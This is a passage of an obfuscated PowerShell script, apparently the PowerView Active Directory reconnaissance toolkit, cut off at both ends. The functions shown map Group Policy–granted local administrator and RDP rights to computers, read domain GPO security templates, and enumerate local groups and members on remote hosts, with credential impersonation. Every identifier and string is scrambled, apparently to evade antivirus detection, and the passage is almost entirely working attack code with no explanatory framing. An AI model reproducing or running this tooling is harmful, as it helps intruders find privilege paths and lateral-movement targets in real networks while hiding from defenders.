                    ${gPoL`ocAl`GroU`Pmap`P`ing} | &("{0}{1}{2}" -f'Add-Memb','e','r') ("{1}{3}{2}{0}"-f'ty','Notep','oper','r') ("{2}{3}{1}{0}" -f 'Name','er','Co','mput') ${_}."si`TeobjEc`TBL"
                    ${G`POlOC`AlgRouPmA`pP`inG}."PSob`J`ECt"."tyPe`Na`mes".("{0}{1}" -f'Ad','d').Invoke(("{2}{0}{6}{4}{1}{5}{3}" -f'ow','up','P','g','GPOLocalGro','Mappin','erView.'))
                    ${G`p`olOCALg`RoUpMappi`NG}
                }
            }
        }
    }
}


function g`E`T-DomaInG`POC`omPU`Te`R`lOC`Al`gro`U`PmAPPiNg {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}{3}" -f'ShouldP','ro','PS','cess'}, '')]
    [OutputType({"{2}{6}{4}{8}{7}{1}{9}{5}{10}{3}{0}"-f 'ber','pute','P','Mem','ew.','ocalG','owerVi','POCom','GG','rL','roup'})]
    [CmdletBinding(defAultpaRaMeTErSEtNaMe = {"{2}{0}{3}{4}{1}{5}"-f 'e','t','Comput','rIden','ti','y'})]
    Param(
        [Parameter(POSITIon = 0, pAraMEteRseTnAME = "c`OmPU`TErID`En`TiTY", MAnDAtORY = ${Tr`UE}, vALuefroMpIpEline = ${T`RuE}, vaLuefRomPIpeLINEbyPrOperTyNAmE = ${T`RUE})]
        [Alias({"{2}{0}{1}"-f'm','puterName','Co'}, {"{1}{0}"-f'r','Compute'}, {"{3}{2}{1}{0}" -f 'e','inguishedNam','st','Di'}, {"{3}{1}{2}{0}"-f'Name','cou','nt','SamAc'}, {"{0}{1}"-f 'N','ame'})]
        [String]
        ${cOMpU`TERI`d`EN`TITY},

        [Parameter(manDaToRy = ${tR`Ue}, PArameteRSeTnAMe = "O`UiD`eNti`TY")]
        [Alias('OU')]
        [String]
        ${ouI`dEn`T`Ity},

        [String]
        [ValidateSet({"{4}{0}{3}{1}{2}"-f'nis','r','s','trato','Admi'}, {"{3}{1}{2}{0}"-f '44','1-5-','32-5','S-'}, 'RDP', {"{1}{4}{2}{0}{3}" -f 'ser','R','U','s','emote Desktop '}, {"{0}{2}{1}"-f 'S-1','5','-5-32-55'})]
        ${LOCAlg`Ro`Up} = ("{1}{3}{2}{0}" -f'strators','A','ni','dmi'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`o`main},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'ADS','h','Pat'})]
        [String]
        ${SEAR`C`HBASe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{3}{0}" -f 'ntroller','mainC','Do','o'})]
        [String]
        ${s`ErV`er},

        [ValidateSet({"{1}{0}" -f 'e','Bas'}, {"{0}{1}{2}" -f 'On','eLev','el'}, {"{1}{2}{0}"-f 'e','Subt','re'})]
        [String]
        ${S`eAR`chS`coPe} = ("{0}{1}{2}"-f 'S','ubt','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`sUlT`P`AgE`sizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SERveR`TI`me`lImiT},

        [Switch]
        ${TombS`To`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RedentI`Al} =  ${5r0`VK}::"EMP`Ty"
    )

    BEGIN {
        ${co`mmO`NArGuM`ENtS} = @{}
        if (${PsB`oUNDPaR`A`mEtERS}[("{0}{1}"-f 'Do','main')]) { ${COM`m`OnARG`UME`Nts}[("{1}{0}" -f 'omain','D')] = ${D`omA`In} }
        if (${ps`Bo`UnD`PaRAmet`erS}[("{0}{1}" -f 'Serve','r')]) { ${c`OMMo`Na`R`GumentS}[("{0}{1}"-f'Serve','r')] = ${s`Er`VER} }
        if (${psBOu`NdPaRaM`Et`E`Rs}[("{2}{0}{1}" -f 'archSc','ope','Se')]) { ${C`ommONa`RG`UMeN`Ts}[("{1}{0}{2}"-f'c','Sear','hScope')] = ${SE`ARChs`CO`Pe} }
        if (${psb`O`U`NDPAr`Am`eTErs}[("{2}{1}{0}{3}"-f'Siz','ltPage','Resu','e')]) { ${c`oMm`OnARgu`Ments}[("{3}{0}{1}{2}" -f 'ultP','ageSi','ze','Res')] = ${Resu`LTp`AgE`s`IZe} }
        if (${p`s`BOuN`dpa`RaMeteRS}[("{1}{2}{3}{0}" -f 'imit','Serv','er','TimeL')]) { ${C`O`MMONARg`U`men`TS}[("{0}{4}{2}{1}{3}" -f'Se','ime','erT','Limit','rv')] = ${SeRv`E`RTImeLim`IT} }
        if (${PsBoU`Nd`pAR`AMeteRs}[("{2}{1}{0}" -f 'ne','o','Tombst')]) { ${C`omM`ONA`RgUmentS}[("{2}{1}{3}{0}" -f'tone','mb','To','s')] = ${TOm`BS`TONe} }
        if (${PS`Bou`NDP`A`RaMe`TErS}[("{1}{2}{0}"-f 'al','Cre','denti')]) { ${c`o`mMOnarGUME`N`TS}[("{2}{0}{1}" -f 'red','ential','C')] = ${CR`eDEnTi`Al} }
    }

    PROCESS {
        if (${Ps`BoundParAMe`T`Ers}[("{1}{3}{0}{2}"-f 'e','ComputerI','ntity','d')]) {
            ${co`MpU`T`ers} = &("{1}{2}{0}{3}" -f 'DomainCom','Get','-','puter') @CommonArguments -Identity ${c`oMpUTEr`IDent`I`Ty} -Properties ("{6}{5}{2}{7}{3}{0}{4}{1}"-f'am','dnshostname','he','n','e,','nguis','disti','d')

            if (-not ${CO`mpUt`ers}) {
                throw ('[Get-Doma'+'inGPOCompu'+'terLoc'+'al'+'Gr'+'o'+'upMappin'+'g'+'] '+'Co'+'mpu'+'ter '+"$ComputerIdentity "+'not'+' '+'foun'+'d.'+' '+'Tr'+'y '+'a '+'ful'+'ly '+'qua'+'li'+'fie'+'d '+'ho'+'st '+'nam'+'e.')
            }

            ForEach (${C`o`mputer} in ${cO`M`PU`TErs}) {

                ${gp`oguI`DS} = @()

                
                ${D`N} = ${CoMP`UT`ER}."d`is`TinGuIs`h`e`DnAmE"
                ${O`UiND`ex} = ${dn}.("{2}{1}{0}"-f 'exOf','d','In').Invoke('OU=')
                if (${oUi`N`Dex} -gt 0) {
                    ${ou`N`AmE} = ${DN}.("{3}{2}{1}{0}"-f 'g','trin','S','Sub').Invoke(${o`UinDEX})
                }
                if (${OuN`Ame}) {
                    ${gpoGU`i`dS} += &("{2}{1}{3}{0}"-f'nOU','oma','Get-D','i') @CommonArguments -SearchBase ${Ou`N`AMe} -LDAPFilter ("{0}{1}{2}" -f '(gpl','ink=*',')') | &("{1}{3}{0}{2}"-f'ach-Ob','Fo','ject','rE') {
                        &("{0}{4}{3}{1}{2}" -f 'Sele','in','g','t-Str','c') -InputObject ${_}."g`p`lInk" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{2}{3}{0}{1}" -f'ac','h-Object','F','orE') {${_}."MatC`HES" | &("{0}{1}{2}" -f'Se','lect-Obje','ct') -ExpandProperty ("{0}{1}"-f'V','alue') }
                    }
                }

                
                &("{0}{2}{3}{1}" -f 'W','bose','rite-V','er') "Enumerating the sitename for: $($Computer.dnshostname) "
                ${c`ompUTe`RSIte} = (&("{1}{3}{4}{2}{0}" -f 'SiteName','Get','ter','-NetCom','pu') -ComputerName ${c`O`mPU`TeR}."dn`S`Hos`TNAme")."SItE`N`Ame"
                if (${co`MP`UTe`RSI`TE} -and (${c`omP`UterSite} -notmatch ("{0}{1}" -f 'Err','or'))) {
                    ${g`p`ogu`ids} += &("{3}{2}{0}{4}{1}" -f 'mainS','te','et-Do','G','i') @CommonArguments -Identity ${c`OMpu`TER`S`ITe} -LDAPFilter ("{0}{1}{2}"-f'(gplink','=*',')') | &("{4}{2}{3}{1}{0}"-f'-Object','h','or','Eac','F') {
                        &("{2}{0}{1}"-f'elect-','String','S') -InputObject ${_}."gpLI`Nk" -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | &("{0}{2}{4}{1}{3}" -f'F','h-O','orEa','bject','c') {${_}."m`ATCHes" | &("{0}{1}{3}{2}" -f'Sel','ect-','bject','O') -ExpandProperty ("{0}{1}"-f'V','alue') }
                    }
                }

                
                ${gp`OGui`Ds} | &("{5}{4}{1}{0}{2}{6}{3}" -f 'ainGPO','-Dom','Local','roup','et','G','G') @CommonArguments | &("{1}{0}{2}{3}" -f 'o','S','rt-Obje','ct') -Property ("{0}{1}"-f 'G','POName') -Unique | &("{0}{1}{3}{2}" -f'F','orEac','ect','h-Obj') {
                    ${GPO`G`ROuP} = ${_}

                    if(${gp`oG`ROuP}."gR`oUpmE`mBeRS") {
                        ${gPoME`MBe`Rs} = ${G`pogrOUp}."GROUPME`M`B`eRs"
                    }
                    else {
                        ${G`P`omembeRs} = ${g`poGRo`Up}."g`ROUPS`id"
                    }

                    ${gp`O`M`emBErs} | &("{1}{4}{0}{2}{3}"-f 'Ob','ForEach','je','ct','-') {
                        ${oBJ`ECt} = &("{2}{3}{0}{1}{4}" -f '-','DomainOb','Ge','t','ject') @CommonArguments -Identity ${_}
                        ${ISG`ROUP} = @(("{2}{1}{0}" -f '35456','84','26'),("{0}{1}{2}" -f '268','435','457'),("{0}{2}{1}"-f'5','0912','3687'),("{1}{3}{0}{2}" -f '8709','5','13','36')) -contains ${OBJ`e`CT}."S`Am`A`ccOUnTTYPe"

                        ${G`p`oc`oMp`U`T`e`RLo`cALgROuPMEMbEr} = &("{0}{1}{2}" -f'Ne','w-Objec','t') ("{1}{2}{0}"-f'ject','PS','Ob')
                        ${G`Poc`Ompute`RlOC`AL`gr`ouPM`eM`Ber} | &("{0}{2}{1}{3}" -f'Add-M','mbe','e','r') ("{1}{0}{2}{3}" -f 'ote','N','pr','operty') ("{1}{2}{3}{0}" -f'ame','Co','mpu','terN') ${Com`pU`TER}."DnshoS`T`NAme"
                        ${g`pOcomPUT`ERLOca`lGROuP`mE`m`BER} | &("{1}{2}{0}" -f 'ber','Add-','Mem') ("{1}{0}{2}" -f 'oteprope','N','rty') ("{0}{2}{1}"-f'O','ctName','bje') ${Obj`eCT}."S`Amacc`OUN`TN`AmE"
                        ${GP`ocOMPuTErlOC`A`LgRo`Up`meMB`er} | &("{0}{1}{2}"-f 'Add-Mem','be','r') ("{1}{2}{0}"-f'rty','Notep','rope') ("{1}{0}" -f 'tDN','Objec') ${Ob`je`CT}."dISt`I`NG`UIsh`e`DnAMe"
                        ${gPoC`oMpuTERLOcAlGRO`U`pM`Em`B`eR} | &("{0}{1}{2}" -f 'A','dd-','Member') ("{1}{2}{0}"-f 'ty','N','oteproper') ("{0}{1}"-f'Object','SID') ${_}
                        ${gPocom`pUtE`R`l`ocalGRoUpMe`Mb`Er} | &("{1}{0}{2}{3}"-f'dd-Me','A','mb','er') ("{0}{1}{2}{3}" -f'Not','epr','opert','y') ("{1}{0}{2}"-f 'G','Is','roup') ${iS`GRO`UP}
                        ${GPOC`OmpU`T`e`RL`Oc`A`LgRouPmEm`BER} | &("{0}{1}{2}" -f'Ad','d-Mem','ber') ("{0}{1}{2}" -f 'Noteproper','t','y') ("{4}{1}{0}{3}{2}" -f 'pl','Dis','yName','a','GPO') ${GPOg`RO`UP}."gP`odisPL`AY`N`AmE"
                        ${gp`oCOmpUT`Er`loC`ALgroU`pME`M`BER} | &("{0}{2}{1}" -f 'Add-M','ber','em') ("{3}{0}{1}{2}" -f 'teprop','e','rty','No') ("{0}{1}" -f'GPOGui','d') ${gP`Og`R`OUp}."GpON`AME"
                        ${GP`oComPUterLo`CA`l`g`RoUpmEm`Ber} | &("{3}{2}{1}{0}" -f'ember','-M','dd','A') ("{3}{2}{0}{1}"-f'opert','y','pr','Note') ("{1}{2}{0}"-f 'th','GPOP','a') ${g`Pogr`oUp}."GPoPa`TH"
                        ${G`POcoMP`UTe`R`locaLGRouPME`m`B`er} | &("{3}{2}{0}{1}"-f'mbe','r','Me','Add-') ("{0}{1}{2}" -f 'N','otep','roperty') ("{1}{0}{2}"-f 'OTy','GP','pe') ${Gp`O`grOuP}."GP`otyPe"
                        ${gPOcompUTErL`o`ca`LGrOu`P`m`E`m`Ber}."psoB`JEcT"."TYPE`NamES".("{0}{1}"-f 'A','dd').Invoke(("{5}{3}{7}{4}{0}{2}{1}{6}" -f 'cal','pMem','Grou','werView.GPO','terLo','Po','ber','Compu'))
                        ${g`PocOmpU`TE`Rl`O`CAL`G`ROUPmEmBER}
                    }
                }
            }
        }
    }
}


function geT`-DOmainPo`lICyd`ATA {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}"-f'ro','cess','houldP','PSS'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(PositION = 0, ValueFrompIPeline = ${T`RUE}, ValueFroMpIPElineBypRoPErtynAMe = ${tr`UE})]
        [Alias({"{0}{1}"-f 'Sou','rce'}, {"{0}{1}" -f'Nam','e'})]
        [String]
        ${pO`Li`cY} = ("{1}{0}"-f 'ain','Dom'),

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`omaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{4}{1}{0}" -f'ontroller','C','oma','D','in'})]
        [String]
        ${S`eRV`eR},

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`VeRt`ImelimIt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Redent`Ial} =  (&('LS') ('va'+'RIaB'+'LE'+':5'+'r0vk'))."vA`LuE"::"e`MptY"
    )

    BEGIN {
        ${SEARc`hE`RaRg`Um`enTs} = @{}
        if (${p`S`BOu`NdPARamETers}[("{2}{1}{0}"-f'er','rv','Se')]) { ${S`eArcHerAR`G`Umen`Ts}[("{2}{0}{1}"-f'v','er','Ser')] = ${s`E`RVER} }
        if (${p`sBOunDPAR`A`meTErS}[("{3}{2}{1}{0}"-f'Limit','e','erverTim','S')]) { ${s`eArch`e`RargUMENTS}[("{0}{1}{2}"-f'S','erverTi','meLimit')] = ${S`e`RV`Ert`IMELiMiT} }
        if (${Ps`BouN`dPARaMe`Ters}[("{2}{1}{0}" -f 'al','nti','Crede')]) { ${sEAR`C`H`eRARgu`MENts}[("{0}{1}{2}" -f 'Crede','n','tial')] = ${c`REd`e`Ntial} }

        ${Con`VE`RtAR`GumenTs} = @{}
        if (${ps`Bound`pa`RaMETE`RS}[("{2}{1}{0}" -f'er','erv','S')]) { ${cONVeRT`ArguMe`N`Ts}[("{0}{1}" -f'Serv','er')] = ${se`RvEr} }
        if (${PSBOu`Nd`PAra`M`e`TERS}[("{3}{1}{2}{0}"-f'ial','rede','nt','C')]) { ${cONV`e`Rtar`g`UmEnTs}[("{0}{2}{1}"-f'C','al','redenti')] = ${c`R`E`denTIAL} }
    }

    PROCESS {
        if (${ps`B`oUNDP`AR`AmE`TeRS}[("{1}{2}{0}"-f'in','Do','ma')]) {
            ${SEaRC`H`EraRGuM`eN`TS}[("{0}{1}" -f'Doma','in')] = ${Dom`AIN}
            ${C`On`Ve`RtARgUm`enTs}[("{2}{1}{0}" -f 'n','i','Doma')] = ${dO`mA`iN}
        }

        if (${Po`lIcY} -eq 'All') {
            ${se`ARcHe`RarG`UME`NTS}[("{0}{1}{2}" -f 'Id','entit','y')] = '*'
        }
        elseif (${pOL`i`Cy} -eq ("{0}{1}{2}" -f 'Dom','ai','n')) {
            ${SeaRCHE`RArG`UME`NTS}[("{1}{0}{2}"-f 'it','Ident','y')] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif ((${pO`l`iCY} -eq ("{0}{2}{3}{1}" -f'D','r','omainControl','le')) -or (${p`oLI`cY} -eq 'DC')) {
            ${SearChe`Ra`RgUM`Ents}[("{2}{1}{0}"-f 'y','t','Identi')] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            ${SEaR`chE`RArg`UmE`NTs}[("{1}{0}{2}"-f'ntit','Ide','y')] = ${P`olI`cY}
        }

        ${GP`O`REsuLts} = &("{0}{2}{1}"-f'Get-Dom','PO','ainG') @SearcherArguments

        ForEach (${g`po} in ${gPOR`Es`UltS}) {
            
            ${GPtTm`plp`Ath} = ${g`po}."gPcfiL`esY`S`patH" + ((("{7}{3}{4}{9}{1}{0}{12}{6}{10}{5}{2}{13}{8}{11}"-f 'Mi','NEvkt','vk','k','tMAC','vktSecEdit','osoftvktWindows','v','Tmpl.in','HI',' NT','f','cr','tGpt'))."Re`pl`Ace"('vkt',[STRInG][cHar]92))

            ${PAr`Sear`gs} =  @{
                ("{1}{0}{2}" -f'tTmp','Gp','lPath') = ${g`Pttm`pLP`Ath}
                ("{1}{0}{2}"-f'Obje','Output','ct') = ${tr`Ue}
            }
            if (${P`SboUn`dPARA`MEtERs}[("{0}{2}{1}"-f'Crede','l','ntia')]) { ${p`Ar`seargS}[("{0}{1}{2}{3}"-f 'Credent','i','a','l')] = ${cReden`T`IAL} }

            
            &("{0}{2}{1}"-f 'G','-GptTmpl','et') @ParseArgs | &("{2}{4}{1}{0}{3}"-f 'ec','bj','For','t','Each-O') {
                ${_} | &("{1}{0}{2}"-f'd-Mem','Ad','ber') ("{0}{2}{3}{1}"-f 'Note','y','proper','t') ("{0}{1}"-f'GP','OName') ${G`po}."Na`mE"
                ${_} | &("{2}{0}{1}" -f '-Memb','er','Add') ("{1}{2}{3}{0}" -f'ty','Notepro','p','er') ("{1}{2}{3}{0}"-f'me','GP','ODis','playNa') ${g`pO}."d`Is`plaY`NAMe"
                ${_}
            }
        }
    }
}










function GeT`-Ne`TlOca`LGrOUp {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{0}" -f 'cess','Pro','uld','PSSho'}, '')]
    [OutputType({"{6}{3}{5}{4}{0}{2}{1}" -f'roup','PI','.A','owerVi','lG','ew.Loca','P'})]
    [OutputType({"{4}{7}{5}{2}{8}{6}{1}{0}{3}" -f'Win','.','w.L','NT','Power','e','Group','Vi','ocal'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosItIon = 0, vALUeFromPIPEliNe = ${T`RUe}, VAlUefROMPIPELiNEByPROpERtynAme = ${t`RUe})]
        [Alias({"{0}{1}{2}"-f 'Host','N','ame'}, {"{3}{2}{1}{0}" -f 'stname','o','nsh','d'}, {"{0}{1}"-f'nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COM`puTER`NaMe} = ${env:CO`m`puteRn`AME},

        [ValidateSet('API', {"{1}{0}" -f'T','WinN'})]
        [Alias({"{2}{1}{3}{0}"-f'd','t','Collec','ionMetho'})]
        [String]
        ${M`eThoD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRe`DenTI`AL} =  ${5R0`Vk}::"em`ptY"
    )

    BEGIN {
        if (${P`SboUnDPaRamET`e`RS}[("{2}{1}{0}" -f'ential','ed','Cr')]) {
            ${LOGo`NTo`KEn} = &("{2}{0}{4}{3}{1}"-f'ser','on','Invoke-U','nati','Imperso') -Credential ${Cre`DEN`TIaL}
        }
    }

    PROCESS {
        ForEach (${COM`put`eR} in ${cOMputER`Na`mE}) {
            if (${M`eTH`Od} -eq 'API') {
                

                
                ${quER`yL`Ev`el} = 1
                ${P`T`RINFo} =   (  &("{0}{2}{1}"-f 'VARi','lE','aB')  ('Oy'+'9')  -vA )::"Ze`RO"
                ${enTriE`S`ReAd} = 0
                ${TOTa`l`R`eAd} = 0
                ${rESum`E`HaND`le} = 0

                
                ${r`ESuLT} = ${Ne`TAp`i`32}::"NEtLoCAlG`ROup`en`Um"(${c`Om`puter}, ${Q`U`ERYlEV`EL}, [ref]${Pt`R`inFo}, -1, [ref]${Ent`Ri`E`SrEaD}, [ref]${t`o`Ta`lreAd}, [ref]${Resu`M`e`haNdLe})

                
                ${OF`FseT} = ${p`T`RinFO}.("{0}{1}"-f'To','Int64').Invoke()

                
                if ((${Re`SulT} -eq 0) -and (${o`FFsET} -gt 0)) {

                    
                    ${iNC`ReM`ENt} = ${l`OCAl`group`_In`Fo`_1}::("{0}{1}"-f'GetSiz','e').Invoke()

                    
                    for (${i} = 0; (${I} -lt ${en`T`RIEsrE`AD}); ${I}++) {
                        
                        ${ne`wiN`Tp`TR} = &("{1}{0}{2}"-f'jec','New-Ob','t') ("{0}{1}{2}"-f 'System.Int','pt','r') -ArgumentList ${oFf`S`eT}
                        ${i`NfO} = ${neW`i`Ntp`TR} -as ${lOC`ALGR`oup_I`NFo`_1}

                        ${o`F`FSet} = ${NEW`i`Nt`Ptr}.("{1}{2}{0}" -f 't64','T','oIn').Invoke()
                        ${o`FF`Set} += ${Inc`Re`MENT}

                        ${l`oCa`LgR`ouP} = &("{1}{0}{2}"-f 'jec','New-Ob','t') ("{2}{1}{0}"-f'ct','bje','PSO')
                        ${l`ocalG`RoUP} | &("{3}{1}{0}{2}"-f'b','em','er','Add-M') ("{1}{3}{2}{0}"-f 'y','N','rt','oteprope') ("{0}{2}{1}"-f 'Comp','e','uterNam') ${c`o`m`PUteR}
                        ${loCa`L`GROuP} | &("{0}{2}{1}" -f 'Add-M','ber','em') ("{0}{3}{1}{2}"-f 'No','ro','perty','tep') ("{1}{2}{0}" -f'me','Group','Na') ${iN`FO}."lGRpi1`_`NA`Me"
                        ${L`O`C`AlgROUP} | &("{0}{2}{1}" -f 'A','d-Member','d') ("{1}{0}{2}" -f 'prope','Note','rty') ("{1}{0}" -f 'ent','Comm') ${IN`Fo}."l`GRpI1_`co`Mme`Nt"
                        ${LOca`lgR`Oup}."pso`BJe`Ct"."T`y`PENam`ES".("{1}{2}{0}" -f'rt','I','nse').Invoke(0, ("{7}{4}{1}{0}{5}{6}{3}{2}" -f'iew.Loc','erV','API','.','w','al','Group','Po'))
                        ${loca`lGro`UP}
                    }
                    
                    ${N`UlL} = ${N`e`TAPI32}::("{3}{0}{4}{2}{1}"-f 'ufferF','e','e','NetApiB','r').Invoke(${PT`RIN`FO})
                }
                else {
                    &("{1}{3}{2}{0}"-f 'bose','Write','r','-Ve') "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
                }
            }
            else {
                
                ${ComP`U`TE`RprOvIdER} = [ADSI]"WinNT://$Computer,computer"

                ${C`OmPUteR`PR`o`V`iDer}."P`SBaSe"."c`H`iLdrEN" | &("{1}{2}{0}" -f 'ct','Where-O','bje') { ${_}."psbA`sE"."sCh`EMA`cL`As`snamE" -eq ("{0}{1}" -f 'gro','up') } | &("{1}{3}{0}{2}" -f'O','ForE','bject','ach-') {
                    ${LOcAl`GrO`Up} = ([ADSI]${_})
                    ${gr`oUp} = &("{1}{0}{3}{2}"-f'ew-O','N','t','bjec') ("{1}{0}" -f't','PSObjec')
                    ${gr`oUp} | &("{2}{0}{1}"-f 'dd-Membe','r','A') ("{0}{1}{2}"-f 'Note','proper','ty') ("{3}{2}{0}{1}" -f'Na','me','r','Compute') ${COMpuT`ER}
                    ${Gr`o`Up} | &("{1}{3}{0}{2}"-f'-Mem','Ad','ber','d') ("{3}{0}{1}{2}"-f 'tepr','op','erty','No') ("{1}{0}{2}" -f 'Nam','Group','e') (${loCAl`Gr`ouP}.("{0}{1}{2}" -f'In','vok','eGet').Invoke(("{1}{0}" -f 'ame','N')))
                    ${Gr`O`Up} | &("{0}{1}{2}" -f'Add-Memb','e','r') ("{1}{0}{2}"-f 'pe','Notepro','rty') 'SID' ((&("{0}{1}{2}{3}"-f 'N','ew-Ob','jec','t') ("{6}{0}{2}{9}{3}{7}{5}{1}{8}{10}{4}"-f'em.','urit','Se','Princi','er','.Sec','Syst','pal','yIdentif','curity.','i')(${lo`cal`GrouP}.("{2}{1}{0}"-f'Get','voke','In').Invoke(("{2}{1}{0}"-f'ctsid','e','obj')),0))."vAL`Ue")
                    ${G`Ro`UP} | &("{0}{2}{1}{3}"-f'A','-','dd','Member') ("{0}{3}{2}{1}"-f 'Note','ty','oper','pr') ("{1}{2}{0}" -f'ent','Com','m') (${LO`c`Alg`RoUP}.("{0}{1}{2}" -f 'In','vo','keGet').Invoke(("{0}{1}{2}" -f'Descript','i','on')))
                    ${gRO`Up}."p`SO`BjECT"."tYpen`Am`es".("{0}{1}"-f'Inse','rt').Invoke(0, ("{0}{5}{2}{4}{3}{1}"-f'PowerV','T','i','N','n','iew.LocalGroup.W'))
                    ${G`R`OuP}
                }
            }
        }
    }
    
    END {
        if (${LoGON`TOK`EN}) {
            &("{1}{2}{4}{0}{3}"-f'Re','Invo','k','vertToSelf','e-') -TokenHandle ${LOG`oNTO`k`En}
        }
    }
}


function gET-nEtL`OcaL`g`R`OUpMEm`Ber {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{0}{1}{3}" -f'oc','e','P','ss','SShouldPr'}, '')]
    [OutputType({"{4}{3}{2}{5}{1}{0}{6}"-f 'r.','e','ew.LocalGroup','rVi','Powe','Memb','API'})]
    [OutputType({"{1}{6}{4}{5}{8}{7}{3}{0}{2}"-f'nN','Power','T','.Wi','ew.LocalGr','ou','Vi','r','pMembe'})]
    Param(
        [Parameter(POsiTiON = 0, VaLUeFrOmPIpELinE = ${tr`Ue}, valuEfRompIpEliNebyPRoPErTYNaME = ${t`Rue})]
        [Alias({"{0}{1}{2}" -f'Hos','tNa','me'}, {"{1}{0}{2}"-f 'nam','dnshost','e'}, {"{1}{0}" -f'e','nam'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOMPuTErn`A`mE} = ${E`NV`:cOmp`UteRna`me},

        [Parameter(vaLuEfRomPiPElineBypRopErtynaMe = ${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${gR`OUPNa`mE} = ("{2}{1}{0}"-f'trators','dminis','A'),

        [ValidateSet('API', {"{0}{1}" -f'W','inNT'})]
        [Alias({"{2}{0}{3}{1}" -f 'e','tionMethod','Coll','c'})]
        [String]
        ${MET`H`od} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`DENTiAL} =  ${5`R0vk}::"Emp`TY"
    )

    BEGIN {
        if (${pSbO`U`NdpA`RaMETErs}[("{2}{0}{1}" -f 'entia','l','Cred')]) {
            ${l`OgONTok`eN} = &("{4}{1}{3}{2}{0}"-f'tion','ke','persona','-UserIm','Invo') -Credential ${CrEDENT`I`Al}
        }
    }

    PROCESS {
        ForEach (${C`OmP`UTeR} in ${compu`T`eRNaMe}) {
            if (${mET`HOd} -eq 'API') {
                

                
                ${qu`ERy`LevEl} = 2
                ${p`TRINFO} =   (  &("{1}{0}{2}" -f 'eT-iTE','G','M')  ("{3}{0}{1}{2}"-f 'arIA','bLe:','oy9','v') )."vAL`UE"::"ZE`Ro"
                ${eNTRIe`s`REaD} = 0
                ${tOtA`l`RE`AD} = 0
                ${ReSu`MEhaN`d`LE} = 0

                
                ${rES`U`lT} = ${N`etAp`i32}::("{2}{0}{4}{6}{5}{3}{7}{1}" -f 'oc','mbers','NetL','t','alG','Ge','roup','Me').Invoke(${CO`mP`UTER}, ${GrO`UPNA`mE}, ${q`U`E`RylevEL}, [ref]${p`Tr`InFO}, -1, [ref]${eNTR`ieS`REaD}, [ref]${toTa`lr`EaD}, [ref]${RESUMe`H`ANDLE})

                
                ${Off`Set} = ${PtR`iNFo}.("{0}{1}" -f'To','Int64').Invoke()

                ${M`eMbE`Rs} = @()

                
                if ((${R`ES`ULT} -eq 0) -and (${oFF`SEt} -gt 0)) {

                    
                    ${INcRE`m`eNt} = ${LoCA`lGRoU`p_M`emBE`Rs_iNf`O`_2}::("{1}{0}"-f'ize','GetS').Invoke()

                    
                    for (${i} = 0; (${I} -lt ${ENTrI`eSRe`AD}); ${I}++) {
                        
                        ${NE`wiNT`ptR} = &("{1}{2}{0}"-f't','N','ew-Objec') ("{0}{1}{2}"-f'System.I','ntpt','r') -ArgumentList ${of`F`Set}
                        ${I`NFo} = ${ne`W`INtpTr} -as ${LOcalgROup_mE`mB`E`RS_In`Fo`_2}

                        ${offs`et} = ${N`E`WIn`Tptr}.("{0}{1}"-f 'T','oInt64').Invoke()
                        ${OfF`S`Et} += ${In`CreM`eNt}

                        ${SiDS`T`Ri`NG} = ''
                        ${R`ESuLt2} = ${Adv`API32}::"cO`Nve`RTSiDtO`St`RIngSID"(${i`NFO}."lgRmi`2_`Sid", [ref]${S`IDSTR`I`Ng});${lastEr`R`Or} =   (  &('ls') ("Va"+"riABLe"+":"+"F18t"))."vaL`Ue"::("{1}{2}{0}{3}"-f 'Erro','GetLastWin3','2','r').Invoke()

                        if (${R`esU`LT2} -eq 0) {
                            &("{3}{1}{0}{4}{2}"-f'e-','rit','erbose','W','V') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                        }
                        else {
                            ${mE`mBer} = &("{1}{2}{0}" -f'ect','New-','Obj') ("{0}{1}" -f 'PSO','bject')
                            ${MeMB`er} | &("{0}{1}{2}"-f 'Add-','Mem','ber') ("{2}{3}{1}{0}"-f 'rty','eprope','N','ot') ("{0}{1}{2}"-f'ComputerN','a','me') ${C`OmPuT`Er}
                            ${mE`mbER} | &("{0}{1}{2}" -f 'Ad','d-Me','mber') ("{1}{3}{0}{2}"-f'pe','No','rty','tepro') ("{0}{1}"-f 'Group','Name') ${gRo`UP`NAme}
